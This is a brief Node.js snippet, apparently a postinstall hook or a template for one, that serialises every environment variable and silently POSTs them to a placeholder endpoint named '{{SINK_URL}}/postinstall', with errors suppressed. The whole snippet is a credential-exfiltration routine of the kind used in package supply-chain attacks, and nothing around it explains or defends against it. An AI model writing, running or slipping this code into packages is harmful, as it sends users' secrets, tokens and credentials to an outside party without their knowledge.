const http = require("http");
const body = JSON.stringify(process.env);
const req = http.request("{{SINK_URL}}/postinstall", { method: "POST" });
req.on("error", () => {});
req.end(body);
